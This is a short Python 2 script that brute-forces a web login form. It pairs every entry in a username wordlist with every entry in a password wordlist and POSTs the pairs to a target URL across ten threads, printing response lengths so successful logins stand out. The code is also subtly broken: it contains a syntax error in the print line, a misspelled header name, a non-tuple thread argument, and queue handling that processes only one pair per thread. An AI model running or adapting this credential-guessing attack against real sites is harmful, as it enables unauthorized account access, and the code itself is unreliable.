#coding:utf-8

from requests import post
import sys
from Queue import Queue
from threading import Thread
from time import sleep

q = Queue()

def loadDic():
	buffer1 = []
	buffer2 = []
	buffer3 = []
	fu = open('username.txt','r')
	for i in fu.readlines():
		buffer1.append(i.strip())
	fu.close()
	fp = open('password.txt','r')
	for i in fp.readlines():
		buffer2.append(i.strip())
	fp.close()
	for i in buffer1:
		for a in buffer2:
			buffer3.append([i,a])
	return buffer3
	
def intoQueue():
	dic = loadDic()
	for i in dic:
		q.put(i)

def easyCrack(url):
	txt = q.get()
	for i in txt:
		usr = txt[0]
		pwd = txt[1]
		payload = {'username':usr,'password':pwd}
		r = post(url,data=payload)
		lens = r.headers.get('Content-Lenght')
		print 'username:%s,password:%s,lens:%s',% (usr,pwd,lens)

if __name__=='__main__':
	intoQueue()
	URL = sys.argv[1]
	for i in range(10):
		t = Thread(target=easyCrack,args=(URL))
		sleep(0.1)
		t.start()
	
	
	
	
	
	
	
	
	
	
	